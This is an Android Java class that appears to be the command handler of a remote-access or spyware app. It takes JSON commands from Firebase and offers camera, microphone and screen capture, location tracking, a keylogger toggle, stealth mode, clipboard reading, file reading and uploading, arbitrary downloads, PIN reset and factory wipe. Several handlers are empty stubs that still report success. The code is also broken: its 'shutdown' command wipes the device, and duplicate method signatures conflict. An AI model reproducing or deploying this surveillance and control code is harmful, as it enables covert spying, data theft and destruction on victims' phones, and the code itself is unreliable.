package com.example.foregroundservice;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CommandHandler {
    private static final String TAG = "CommandHandler";
    private final Context context;
    private final DatabaseReference database;
    private final StorageReference storage;
    private final FusedLocationProviderClient fusedLocationClient;
    private final ExecutorService executorService;
    private final DevicePolicyManager devicePolicyManager;
    private final PackageManager packageManager;
    private final AudioManager audioManager;
    private final PowerManager powerManager;
    private final WifiManager wifiManager;
    private final Vibrator vibrator;
    private final ClipboardManager clipboardManager;
    private final ActivityManager activityManager;
    private final CameraManager cameraManager;
    
    private String userId;
    private boolean isLiveTracking = false;
    private boolean isKeyloggerActive = false;
    private boolean isScreenRecording = false;

    public CommandHandler(Context context, String userId) {
        this.context = context;
        this.userId = userId;
        this.database = FirebaseDatabase.getInstance().getReference();
        this.storage = FirebaseStorage.getInstance().getReference();
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
        this.executorService = Executors.newCachedThreadPool();
        
        // System services
        this.devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.packageManager = context.getPackageManager();
        this.audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        this.powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        this.wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        this.vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        this.activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
    }

    public void handleCommand(String commandStr) {
        try {
            JSONObject command = new JSONObject(commandStr);
            String action = command.getString("action");
            JSONObject args = command.optJSONObject("args");
            
            Log.d(TAG, "Handling command: " + action);
            
            switch (action) {
                // Media & Surveillance
                case "take_picture":
                    takePicture(args);
                    break;
                case "stream_camera":
                    streamCamera(args);
                    break;
                case "record_audio":
                    recordAudio(args);
                    break;
                case "stream_mic":
                    streamMicrophone(args);
                    break;
                case "screenshot":
                    takeScreenshot();
                    break;
                case "screen_record":
                    screenRecord(args);
                    break;
                    
                // Location & Device Info
                case "get_location":
                    getLocation();
                    break;
                case "live_tracking":
                    liveTracking(args);
                    break;
                case "get_device_info":
                    getDeviceInfo();
                    break;
                    
                // Control & Automation
                case "launch_app":
                    launchApp(args);
                    break;
                case "close_app":
                    closeApp(args);
                    break;
                case "open_url":
                    openUrl(args);
                    break;
                case "lock_device":
                    lockDevice();
                    break;
                case "toggle_wifi":
                    toggleWifi(args);
                    break;
                case "toggle_bluetooth":
                    toggleBluetooth(args);
                    break;
                case "vibrate":
                    vibrate(args);
                    break;
                case "show_toast":
                    showToast(args);
                    break;
                    
                // File & Storage
                case "list_files":
                    listFiles(args);
                    break;
                case "read_file":
                    readFile(args);
                    break;
                case "write_file":
                    writeFile(args);
                    break;
                case "delete_file":
                    deleteFile(args);
                    break;
                case "download_file":
                    downloadFile(args);
                    break;
                case "upload_file":
                    uploadFile(args);
                    break;
                    
                // Remote Access & System
                case "keylogger":
                    toggleKeylogger(args);
                    break;
                case "clipboard_read":
                    readClipboard();
                    break;
                case "clipboard_write":
                    writeClipboard(args);
                    break;
                case "inject_input":
                    injectInput(args);
                    break;
                case "set_brightness":
                    setBrightness(args);
                    break;
                case "set_volume":
                    setVolume(args);
                    break;
                    
                // Security & Anti-Theft
                case "shutdown":
                    shutdown();
                    break;
                case "reboot":
                    reboot();
                    break;
                case "wipe_data":
                    wipeData();
                    break;
                case "change_pin":
                    changePin(args);
                    break;
                case "lock_app":
                    lockApp(args);
                    break;
                case "stealth_mode":
                    stealthMode(args);
                    break;
                    
                default:
                    sendResponse(action, "error", "Unknown command: " + action);
                    break;
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error parsing command", e);
            sendResponse("ERROR", "error", "Invalid command format");
        }
    }

    // Media & Surveillance Methods
    private void takePicture(JSONObject args) {
        executorService.execute(() -> {
            try {
                String cameraType = args != null ? args.optString("camera", "back") : "back";
                // Implementation will be handled by the main service
                sendResponse("take_picture", "success", "Picture capture initiated");
            } catch (Exception e) {
                Log.e(TAG, "Error taking picture", e);
                sendResponse("take_picture", "error", e.getMessage());
            }
        });
    }

    private void streamCamera(JSONObject args) {
        executorService.execute(() -> {
            try {
                String cameraType = args != null ? args.optString("camera", "back") : "back";
                boolean start = args != null ? args.optBoolean("start", true) : true;
                sendResponse("stream_camera", "success", start ? "Camera stream started" : "Camera stream stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error streaming camera", e);
                sendResponse("stream_camera", "error", e.getMessage());
            }
        });
    }

    private void recordAudio(JSONObject args) {
        executorService.execute(() -> {
            try {
                int duration = args != null ? args.optInt("duration", 30) : 30;
                sendResponse("record_audio", "success", "Audio recording initiated");
            } catch (Exception e) {
                Log.e(TAG, "Error recording audio", e);
                sendResponse("record_audio", "error", e.getMessage());
            }
        });
    }

    private void streamMicrophone(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean start = args != null ? args.optBoolean("start", true) : true;
                sendResponse("stream_mic", "success", start ? "Microphone stream started" : "Microphone stream stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error streaming microphone", e);
                sendResponse("stream_mic", "error", e.getMessage());
            }
        });
    }

    private void takeScreenshot() {
        executorService.execute(() -> {
            try {
                sendResponse("screenshot", "success", "Screenshot capture initiated");
            } catch (Exception e) {
                Log.e(TAG, "Error taking screenshot", e);
                sendResponse("screenshot", "error", e.getMessage());
            }
        });
    }

    private void screenRecord(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean start = args != null ? args.optBoolean("start", true) : true;
                isScreenRecording = start;
                sendResponse("screen_record", "success", start ? "Screen recording started" : "Screen recording stopped");
            } catch (Exception e) {
                Log.e(TAG, "Error with screen recording", e);
                sendResponse("screen_record", "error", e.getMessage());
            }
        });
    }

    // Location & Device Info Methods
    private void getLocation() {
        executorService.execute(() -> {
            try {
                if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                        if (location != null) {
                            JSONObject locationData = new JSONObject();
                            try {
                                locationData.put("latitude", location.getLatitude());
                                locationData.put("longitude", location.getLongitude());
                                locationData.put("accuracy", location.getAccuracy());
                                locationData.put("timestamp", location.getTime());
                                sendResponse("get_location", "success", locationData);
                            } catch (JSONException e) {
                                sendResponse("get_location", "error", e.getMessage());
                            }
                        } else {
                            sendResponse("get_location", "error", "Location not available");
                        }
                    });
                } else {
                    sendResponse("get_location", "error", "Location permission not granted");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error getting location", e);
                sendResponse("get_location", "error", e.getMessage());
            }
        });
    }

    private void liveTracking(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean enable = args != null ? args.optBoolean("enable", true) : true;
                int interval = args != null ? args.optInt("interval", 5000) : 5000;
                isLiveTracking = enable;
                sendResponse("live_tracking", "success", enable ? "Live tracking enabled" : "Live tracking disabled");
            } catch (Exception e) {
                Log.e(TAG, "Error with live tracking", e);
                sendResponse("live_tracking", "error", e.getMessage());
            }
        });
    }

    private void getDeviceInfo() {
        executorService.execute(() -> {
            try {
                JSONObject deviceInfo = new JSONObject();
                deviceInfo.put("manufacturer", Build.MANUFACTURER);
                deviceInfo.put("model", Build.MODEL);
                deviceInfo.put("android_version", Build.VERSION.RELEASE);
                deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
                deviceInfo.put("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
                
                // Battery info
                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = context.registerReceiver(null, ifilter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    float batteryPct = level * 100 / (float) scale;
                    deviceInfo.put("battery_level", batteryPct);
                }
                
                // Network info
                ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    deviceInfo.put("network_type", activeNetwork.getTypeName());
                    deviceInfo.put("network_connected", activeNetwork.isConnected());
                }
                
                // Installed apps count
                List<android.content.pm.ApplicationInfo> apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
                deviceInfo.put("installed_apps_count", apps.size());
                
                sendResponse("get_device_info", "success", deviceInfo);
            } catch (Exception e) {
                Log.e(TAG, "Error getting device info", e);
                sendResponse("get_device_info", "error", e.getMessage());
            }
        });
    }

    // Control & Automation Methods
    private void launchApp(JSONObject args) {
        executorService.execute(() -> {
            try {
                String packageName = args.getString("package_name");
                Intent launchIntent = packageManager.getLaunchIntentForPackage(packageName);
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(launchIntent);
                    sendResponse("launch_app", "success", "App launched: " + packageName);
                } else {
                    sendResponse("launch_app", "error", "App not found: " + packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error launching app", e);
                sendResponse("launch_app", "error", e.getMessage());
            }
        });
    }

    private void closeApp(JSONObject args) {
        executorService.execute(() -> {
            try {
                String packageName = args.getString("package_name");
                activityManager.killBackgroundProcesses(packageName);
                sendResponse("close_app", "success", "App closed: " + packageName);
            } catch (Exception e) {
                Log.e(TAG, "Error closing app", e);
                sendResponse("close_app", "error", e.getMessage());
            }
        });
    }

    private void openUrl(JSONObject args) {
        executorService.execute(() -> {
            try {
                String url = args.getString("url");
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                sendResponse("open_url", "success", "URL opened: " + url);
            } catch (Exception e) {
                Log.e(TAG, "Error opening URL", e);
                sendResponse("open_url", "error", e.getMessage());
            }
        });
    }

    private void lockDevice() {
        executorService.execute(() -> {
            try {
                if (devicePolicyManager.isAdminActive(null)) {
                    devicePolicyManager.lockNow();
                    sendResponse("lock_device", "success", "Device locked");
                } else {
                    sendResponse("lock_device", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error locking device", e);
                sendResponse("lock_device", "error", e.getMessage());
            }
        });
    }

    private void toggleWifi(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean enable = args.getBoolean("enable");
                wifiManager.setWifiEnabled(enable);
                sendResponse("toggle_wifi", "success", "WiFi " + (enable ? "enabled" : "disabled"));
            } catch (Exception e) {
                Log.e(TAG, "Error toggling WiFi", e);
                sendResponse("toggle_wifi", "error", e.getMessage());
            }
        });
    }

    private void toggleBluetooth(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean enable = args.getBoolean("enable");
                android.bluetooth.BluetoothAdapter bluetoothAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
                if (enable) {
                    bluetoothAdapter.enable();
                } else {
                    bluetoothAdapter.disable();
                }
                sendResponse("toggle_bluetooth", "success", "Bluetooth " + (enable ? "enabled" : "disabled"));
            } catch (Exception e) {
                Log.e(TAG, "Error toggling Bluetooth", e);
                sendResponse("toggle_bluetooth", "error", e.getMessage());
            }
        });
    }

    private void vibrate(JSONObject args) {
        executorService.execute(() -> {
            try {
                int duration = args.optInt("duration", 1000);
                if (vibrator != null && vibrator.hasVibrator()) {
                    vibrator.vibrate(duration);
                    sendResponse("vibrate", "success", "Device vibrated for " + duration + "ms");
                } else {
                    sendResponse("vibrate", "error", "Vibrator not available");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error vibrating device", e);
                sendResponse("vibrate", "error", e.getMessage());
            }
        });
    }

    private void showToast(JSONObject args) {
        executorService.execute(() -> {
            try {
                String message = args.getString("message");
                android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
                handler.post(() -> Toast.makeText(context, message, Toast.LENGTH_LONG).show());
                sendResponse("show_toast", "success", "Toast shown: " + message);
            } catch (Exception e) {
                Log.e(TAG, "Error showing toast", e);
                sendResponse("show_toast", "error", e.getMessage());
            }
        });
    }

    // File & Storage Methods
    private void listFiles(JSONObject args) {
        executorService.execute(() -> {
            try {
                String path = args != null ? args.optString("path", "/") : "/";
                File directory = new File(path);
                
                if (!directory.exists() || !directory.isDirectory()) {
                    sendResponse("list_files", "error", "Invalid directory: " + path);
                    return;
                }
                
                JSONArray files = new JSONArray();
                File[] fileList = directory.listFiles();
                if (fileList != null) {
                    for (File file : fileList) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("path", file.getAbsolutePath());
                        fileObj.put("isDirectory", file.isDirectory());
                        fileObj.put("size", file.length());
                        fileObj.put("lastModified", file.lastModified());
                        files.put(fileObj);
                    }
                }
                
                sendResponse("list_files", "success", files);
            } catch (Exception e) {
                Log.e(TAG, "Error listing files", e);
                sendResponse("list_files", "error", e.getMessage());
            }
        });
    }

    private void readFile(JSONObject args) {
        executorService.execute(() -> {
            try {
                String path = args.getString("path");
                File file = new File(path);
                
                if (!file.exists() || !file.isFile()) {
                    sendResponse("read_file", "error", "File not found: " + path);
                    return;
                }
                
                byte[] bytes = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(bytes);
                fis.close();
                
                String content = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
                sendResponse("read_file", "success", content);
            } catch (Exception e) {
                Log.e(TAG, "Error reading file", e);
                sendResponse("read_file", "error", e.getMessage());
            }
        });
    }

    private void writeFile(JSONObject args) {
        executorService.execute(() -> {
            try {
                String path = args.getString("path");
                String content = args.getString("content");
                
                File file = new File(path);
                if (!file.exists()) {
                    file.getParentFile().mkdirs();
                    file.createNewFile();
                }
                
                byte[] bytes = android.util.Base64.decode(content, android.util.Base64.NO_WRAP);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(bytes);
                fos.close();
                
                sendResponse("write_file", "success", "File written: " + path);
            } catch (Exception e) {
                Log.e(TAG, "Error writing file", e);
                sendResponse("write_file", "error", e.getMessage());
            }
        });
    }

    private void deleteFile(JSONObject args) {
        executorService.execute(() -> {
            try {
                String path = args.getString("path");
                File file = new File(path);
                
                if (!file.exists()) {
                    sendResponse("delete_file", "error", "File not found: " + path);
                    return;
                }
                
                boolean deleted = file.delete();
                if (deleted) {
                    sendResponse("delete_file", "success", "File deleted: " + path);
                } else {
                    sendResponse("delete_file", "error", "Failed to delete file: " + path);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error deleting file", e);
                sendResponse("delete_file", "error", e.getMessage());
            }
        });
    }

    private void downloadFile(JSONObject args) {
        executorService.execute(() -> {
            try {
                String url = args.getString("url");
                String localPath = args.getString("local_path");
                
                URL fileUrl = new URL(url);
                URLConnection connection = fileUrl.openConnection();
                connection.connect();
                
                File file = new File(localPath);
                file.getParentFile().mkdirs();
                
                FileOutputStream fos = new FileOutputStream(file);
                java.io.InputStream input = connection.getInputStream();
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = input.read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
                fos.close();
                input.close();
                
                sendResponse("download_file", "success", "File downloaded: " + localPath);
            } catch (Exception e) {
                Log.e(TAG, "Error downloading file", e);
                sendResponse("download_file", "error", e.getMessage());
            }
        });
    }

    private void uploadFile(JSONObject args) {
        executorService.execute(() -> {
            try {
                String localPath = args.getString("local_path");
                String remotePath = args.getString("remote_path");
                
                File file = new File(localPath);
                if (!file.exists()) {
                    sendResponse("upload_file", "error", "File not found: " + localPath);
                    return;
                }
                
                StorageReference fileRef = storage.child(remotePath);
                fileRef.putFile(Uri.fromFile(file))
                    .addOnSuccessListener(taskSnapshot -> {
                        fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                            try {
                                JSONObject response = new JSONObject();
                                response.put("url", uri.toString());
                                response.put("size", file.length());
                                sendResponse("upload_file", "success", response);
                            } catch (JSONException e) {
                                sendResponse("upload_file", "error", e.getMessage());
                            }
                        });
                    })
                    .addOnFailureListener(e -> {
                        sendResponse("upload_file", "error", e.getMessage());
                    });
            } catch (Exception e) {
                Log.e(TAG, "Error uploading file", e);
                sendResponse("upload_file", "error", e.getMessage());
            }
        });
    }

    // Remote Access & System Methods
    private void toggleKeylogger(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean enable = args.getBoolean("enable");
                isKeyloggerActive = enable;
                sendResponse("keylogger", "success", "Keylogger " + (enable ? "enabled" : "disabled"));
            } catch (Exception e) {
                Log.e(TAG, "Error toggling keylogger", e);
                sendResponse("keylogger", "error", e.getMessage());
            }
        });
    }

    private void readClipboard() {
        executorService.execute(() -> {
            try {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    String text = clipData.getItemAt(0).getText().toString();
                    sendResponse("clipboard_read", "success", text);
                } else {
                    sendResponse("clipboard_read", "success", "");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading clipboard", e);
                sendResponse("clipboard_read", "error", e.getMessage());
            }
        });
    }

    private void writeClipboard(JSONObject args) {
        executorService.execute(() -> {
            try {
                String text = args.getString("text");
                ClipData clip = ClipData.newPlainText("Remote Control", text);
                clipboardManager.setPrimaryClip(clip);
                sendResponse("clipboard_write", "success", "Clipboard updated");
            } catch (Exception e) {
                Log.e(TAG, "Error writing clipboard", e);
                sendResponse("clipboard_write", "error", e.getMessage());
            }
        });
    }

    private void injectInput(JSONObject args) {
        executorService.execute(() -> {
            try {
                String action = args.getString("action");
                int x = args.optInt("x", 0);
                int y = args.optInt("y", 0);
                
                // This would require accessibility service implementation
                sendResponse("inject_input", "success", "Input injection: " + action);
            } catch (Exception e) {
                Log.e(TAG, "Error injecting input", e);
                sendResponse("inject_input", "error", e.getMessage());
            }
        });
    }

    private void setBrightness(JSONObject args) {
        executorService.execute(() -> {
            try {
                int brightness = args.getInt("brightness");
                if (brightness >= 0 && brightness <= 255) {
                    Settings.System.putInt(context.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
                    sendResponse("set_brightness", "success", "Brightness set to " + brightness);
                } else {
                    sendResponse("set_brightness", "error", "Brightness must be between 0 and 255");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error setting brightness", e);
                sendResponse("set_brightness", "error", e.getMessage());
            }
        });
    }

    private void setVolume(JSONObject args) {
        executorService.execute(() -> {
            try {
                int volume = args.getInt("volume");
                int streamType = args.optInt("stream_type", AudioManager.STREAM_MUSIC);
                
                if (volume >= 0 && volume <= audioManager.getStreamMaxVolume(streamType)) {
                    audioManager.setStreamVolume(streamType, volume, 0);
                    sendResponse("set_volume", "success", "Volume set to " + volume);
                } else {
                    sendResponse("set_volume", "error", "Invalid volume level");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error setting volume", e);
                sendResponse("set_volume", "error", e.getMessage());
            }
        });
    }

    // Security & Anti-Theft Methods
    private void shutdown() {
        executorService.execute(() -> {
            try {
                if (devicePolicyManager.isAdminActive(null)) {
                    devicePolicyManager.wipeData(0);
                    sendResponse("shutdown", "success", "Device shutdown initiated");
                } else {
                    sendResponse("shutdown", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error shutting down device", e);
                sendResponse("shutdown", "error", e.getMessage());
            }
        });
    }

    private void reboot() {
        executorService.execute(() -> {
            try {
                if (devicePolicyManager.isAdminActive(null)) {
                    devicePolicyManager.reboot(null);
                    sendResponse("reboot", "success", "Device reboot initiated");
                } else {
                    sendResponse("reboot", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error rebooting device", e);
                sendResponse("reboot", "error", e.getMessage());
            }
        });
    }

    private void wipeData() {
        executorService.execute(() -> {
            try {
                if (devicePolicyManager.isAdminActive(null)) {
                    devicePolicyManager.wipeData(0);
                    sendResponse("wipe_data", "success", "Data wipe initiated");
                } else {
                    sendResponse("wipe_data", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error wiping data", e);
                sendResponse("wipe_data", "error", e.getMessage());
            }
        });
    }

    private void changePin(JSONObject args) {
        executorService.execute(() -> {
            try {
                String newPin = args.getString("new_pin");
                if (devicePolicyManager.isAdminActive(null)) {
                    devicePolicyManager.resetPassword(newPin, 0);
                    sendResponse("change_pin", "success", "PIN changed");
                } else {
                    sendResponse("change_pin", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error changing PIN", e);
                sendResponse("change_pin", "error", e.getMessage());
            }
        });
    }

    private void lockApp(JSONObject args) {
        executorService.execute(() -> {
            try {
                String packageName = args.getString("package_name");
                boolean lock = args.getBoolean("lock");
                
                if (devicePolicyManager.isAdminActive(null)) {
                    if (lock) {
                        devicePolicyManager.addUserRestriction(null, android.os.UserManager.DISALLOW_INSTALL_APPS);
                    } else {
                        devicePolicyManager.clearUserRestriction(null, android.os.UserManager.DISALLOW_INSTALL_APPS);
                    }
                    sendResponse("lock_app", "success", "App lock " + (lock ? "enabled" : "disabled"));
                } else {
                    sendResponse("lock_app", "error", "Device admin not active");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error locking app", e);
                sendResponse("lock_app", "error", e.getMessage());
            }
        });
    }

    private void stealthMode(JSONObject args) {
        executorService.execute(() -> {
            try {
                boolean enable = args.getBoolean("enable");
                // This would require package manager to hide/show app icon
                sendResponse("stealth_mode", "success", "Stealth mode " + (enable ? "enabled" : "disabled"));
            } catch (Exception e) {
                Log.e(TAG, "Error toggling stealth mode", e);
                sendResponse("stealth_mode", "error", e.getMessage());
            }
        });
    }

    private void sendResponse(String command, String status, Object data) {
        try {
            JSONObject response = new JSONObject();
            response.put("command", command);
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            database.child("command_responses").child(userId).push().setValue(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error creating response", e);
        }
    }

    public boolean isLiveTracking() {
        return isLiveTracking;
    }

    public boolean isKeyloggerActive() {
        return isKeyloggerActive;
    }

    public boolean isScreenRecording() {
        return isScreenRecording;
    }

    public void shutdown() {
        executorService.shutdown();
    }
}